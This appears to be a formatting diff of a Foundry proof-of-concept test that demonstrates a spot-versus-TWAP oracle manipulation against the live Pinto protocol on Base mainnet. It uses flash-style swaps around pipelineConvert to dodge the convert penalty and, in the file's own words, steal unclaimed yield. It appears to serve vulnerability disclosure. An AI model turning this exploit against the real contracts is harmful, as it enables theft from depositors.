@@ -24,8 +24,15 @@ interface IPinto {
     function overallCappedDeltaB() external view returns (int256);
     function overallCurrentDeltaB() external view returns (int256);
     function balanceOfStalk(address account) external view returns (uint256);
-    function grownStalkForDeposit(address account, address token, int96 stem) external view returns (uint256);
-    function getTokenDepositsForAccount(address account, address token) external view returns (TokenDepositId memory);
+    function grownStalkForDeposit(
+        address account,
+        address token,
+        int96 stem
+    ) external view returns (uint256);
+    function getTokenDepositsForAccount(
+        address account,
+        address token
+    ) external view returns (TokenDepositId memory);
     function getAddressAndStem(uint256 depositId) external pure returns (address token, int96 stem);
     function pipelineConvert(
         address inputToken,
@@ -33,13 +40,34 @@ interface IPinto {
         uint256[] calldata amounts,
         address outputToken,
         AdvancedPipeCall[] memory advancedPipeCalls
-    ) external payable returns (int96 toStem, uint256 fromAmount, uint256 toAmount, uint256 fromBdv, uint256 toBdv);
+    )
+        external
+        payable
+        returns (
+            int96 toStem,
+            uint256 fromAmount,
+            uint256 toAmount,
+            uint256 fromBdv,
+            uint256 toBdv
+        );
 }
 
 interface IWell {
-    function swapFrom(address fromToken, address toToken, uint256 amountIn, uint256 minAmountOut, address recipient, uint256 deadline) external returns (uint256);
+    function swapFrom(
+        address fromToken,
+        address toToken,
+        uint256 amountIn,
+        uint256 minAmountOut,
+        address recipient,
+        uint256 deadline
+    ) external returns (uint256);
     function tokens() external view returns (address[] memory);
-    function addLiquidity(uint256[] calldata tokenAmountsIn, uint256 minLpAmountOut, address recipient, uint256 deadline) external returns (uint256);
+    function addLiquidity(
+        uint256[] calldata tokenAmountsIn,
+        uint256 minLpAmountOut,
+        address recipient,
+        uint256 deadline
+    ) external returns (uint256);
 }
 
 interface IERC20 {
@@ -51,13 +79,13 @@ interface IERC20 {
 /**
  * @title TWAP/SPOT Oracle Discrepancy PoC
  * @notice Demonstrates how an attacker can bypass convert penalties by manipulating the spot oracle
- * 
+ *
  * @dev Vulnerability Summary:
  * - Convert capacity uses TWAP (overallCappedDeltaB)
- * - Penalty calculation uses SPOT (overallCurrentDeltaB) 
+ * - Penalty calculation uses SPOT (overallCurrentDeltaB)
  * - Attacker can flash-manipulate SPOT while TWAP remains unchanged
  * - This makes penalty calculation see favorable movement, reducing/avoiding penalty
- * 
+ *
  * Attack Flow:
  * 1. Flash swap to manipulate SPOT oracle (push towards peg)
  * 2. Execute pipelineConvert - beforeDeltaB captures manipulated state
@@ -65,7 +93,7 @@ interface IERC20 {
  * 4. Penalty calculation sees "towards peg" movement due to manipulated beforeDeltaB
  * 5. Attacker preserves more grown stalk than without manipulation
  * 6. Swap back, only paying ~0.3% swap fees
- * 
+ *
  * Impact: Theft of unclaimed yield through stalk dilution
  */
 contract OracleManipulationPoC is Test {
@@ -78,9 +106,9 @@ contract OracleManipulationPoC is Test {
     address constant PINTO_CBETH_WELL = 0x3e111115A82dF6190e36ADf0d552880663A4dBF1;
     address constant PIPELINE = 0xb1bE0001f5a373b69b1E132b420e6D9687155e80;
     address constant DEPOSITOR = 0x56c7B85aE9f97b93bD19B98176927eeF63D039BE;
-    
+
     IPinto pinto;
-    
+
     function setUp() public {
         vm.createSelectFork("https://mainnet.base.org");
         pinto = IPinto(PINTO_DIAMOND);
@@ -112,7 +140,11 @@ contract OracleManipulationPoC is Test {
         console.log("--- Scenario A: Normal (No Manipulation) ---");
         vm.prank(DEPOSITOR);
         (int96 stemA, , , , uint256 bdvA) = pinto.pipelineConvert(
-            PINTO_TOKEN, _wrap(stem), _wrap(amount), PINTO_USDC_WELL, _createPipeCalls(amount)
+            PINTO_TOKEN,
+            _wrap(stem),
+            _wrap(amount),
+            PINTO_USDC_WELL,
+            _createPipeCalls(amount)
         );
         uint256 grownA = pinto.grownStalkForDeposit(DEPOSITOR, PINTO_USDC_WELL, stemA);
         console.log("Resulting Grown Stalk (Normal):", _format18(grownA));
@@ -125,16 +157,20 @@ contract OracleManipulationPoC is Test {
         console.log("");
         console.log("--- Scenario B: Manipulated (Flash Swap) ---");
         console.log(">>> Swapping 1M USDC AND 300 cbETH -> Beans to push spot price ABOVE PEG <<<");
-        _doLargeSwap(1_000_000e6); 
+        _doLargeSwap(1_000_000e6);
         _doLargeCbEthSwap(300 ether);
-        
+
         console.log("--- POST-MANIPULATION STATE ---");
         console.log("Spot Overall DeltaB:   ", _formatSigned6(pinto.overallCurrentDeltaB()));
         console.log("TWAP Overall DeltaB:   ", _formatSigned6(pinto.overallCappedDeltaB()));
 
         vm.prank(DEPOSITOR);
         (int96 stemB, , , , uint256 bdvB) = pinto.pipelineConvert(
-            PINTO_TOKEN, _wrap(stem), _wrap(amount), PINTO_USDC_WELL, _createPipeCalls(amount)
+            PINTO_TOKEN,
+            _wrap(stem),
+            _wrap(amount),
+            PINTO_USDC_WELL,
+            _createPipeCalls(amount)
         );
         uint256 grownB = pinto.grownStalkForDeposit(DEPOSITOR, PINTO_USDC_WELL, stemB);
         console.log("Resulting Grown Stalk (Manipulated):", _format18(grownB));
@@ -146,11 +182,11 @@ contract OracleManipulationPoC is Test {
         console.log(">>> REVERSING MANIPULATION: Swapping Beans back to USDC and cbETH <<<");
         _doReverseSwap();
         _doReverseCbEthSwap();
-        
+
         console.log("--- POST-REVERSE STATE ---");
         console.log("Spot Overall DeltaB:   ", _formatSigned6(pinto.overallCurrentDeltaB()));
         console.log("TWAP Overall DeltaB:   ", _formatSigned6(pinto.overallCappedDeltaB()));
-        
+
         // Check user's deposit BDV after reverse - it should remain the same (stored at deposit time)
         uint256 grownBAfterReverse = pinto.grownStalkForDeposit(DEPOSITOR, PINTO_USDC_WELL, stemB);
         console.log("User's Grown Stalk (after reverse):", _format18(grownBAfterReverse));
@@ -224,16 +260,30 @@ contract OracleManipulationPoC is Test {
     function _doLargeSwap(uint256 usdcAmount) internal {
         address[] memory tokens = IWell(PINTO_USDC_WELL).tokens();
         address pintoToken = tokens[0] == USDC ? tokens[1] : tokens[0];
-        
+
         deal(USDC, address(this), usdcAmount);
         IERC20(USDC).approve(PINTO_USDC_WELL, type(uint256).max);
-        IWell(PINTO_USDC_WELL).swapFrom(USDC, pintoToken, usdcAmount, 0, address(this), block.timestamp);
+        IWell(PINTO_USDC_WELL).swapFrom(
+            USDC,
+            pintoToken,
+            usdcAmount,
+            0,
+            address(this),
+            block.timestamp
+        );
     }
 
     function _doLargeCbEthSwap(uint256 cbEthAmount) internal {
         deal(CBETH, address(this), cbEthAmount);
         IERC20(CBETH).approve(PINTO_CBETH_WELL, type(uint256).max);
-        IWell(PINTO_CBETH_WELL).swapFrom(CBETH, PINTO_TOKEN, cbEthAmount, 0, address(this), block.timestamp);
+        IWell(PINTO_CBETH_WELL).swapFrom(
+            CBETH,
+            PINTO_TOKEN,
+            cbEthAmount,
+            0,
+            address(this),
+            block.timestamp
+        );
     }
 
     function _doReverseSwap() internal {
@@ -241,7 +291,14 @@ contract OracleManipulationPoC is Test {
         uint256 beanBalance = IERC20(PINTO_TOKEN).balanceOf(address(this));
         if (beanBalance > 0) {
             IERC20(PINTO_TOKEN).approve(PINTO_USDC_WELL, type(uint256).max);
-            IWell(PINTO_USDC_WELL).swapFrom(PINTO_TOKEN, USDC, beanBalance, 0, address(this), block.timestamp);
+            IWell(PINTO_USDC_WELL).swapFrom(
+                PINTO_TOKEN,
+                USDC,
+                beanBalance,
+                0,
+                address(this),
+                block.timestamp
+            );
         }
     }
 
@@ -250,21 +307,30 @@ contract OracleManipulationPoC is Test {
         uint256 beanBalance = IERC20(PINTO_TOKEN).balanceOf(address(this));
         if (beanBalance > 0) {
             IERC20(PINTO_TOKEN).approve(PINTO_CBETH_WELL, type(uint256).max);
-            IWell(PINTO_CBETH_WELL).swapFrom(PINTO_TOKEN, CBETH, beanBalance, 0, address(this), block.timestamp);
+            IWell(PINTO_CBETH_WELL).swapFrom(
+                PINTO_TOKEN,
+                CBETH,
+                beanBalance,
+                0,
+                address(this),
+                block.timestamp
+            );
         }
     }
 
-    function _createPipeCalls(uint256 beanAmount) internal pure returns (AdvancedPipeCall[] memory) {
+    function _createPipeCalls(
+        uint256 beanAmount
+    ) internal pure returns (AdvancedPipeCall[] memory) {
         bytes memory approveData = abi.encodeWithSelector(
             IERC20.approve.selector,
             PINTO_USDC_WELL,
             type(uint256).max
         );
-        
+
         uint256[] memory tokenAmounts = new uint256[](2);
         tokenAmounts[0] = beanAmount;
         tokenAmounts[1] = 0;
-        
+
         bytes memory addLiquidityData = abi.encodeWithSelector(
             IWell.addLiquidity.selector,
             tokenAmounts,
@@ -272,11 +338,11 @@ contract OracleManipulationPoC is Test {
             PIPELINE,
             type(uint256).max
         );
-        
+
         AdvancedPipeCall[] memory calls = new AdvancedPipeCall[](2);
         calls[0] = AdvancedPipeCall(PINTO_TOKEN, approveData, abi.encode(0));
         calls[1] = AdvancedPipeCall(PINTO_USDC_WELL, addLiquidityData, abi.encode(0));
-        
+
         return calls;
     }
 }
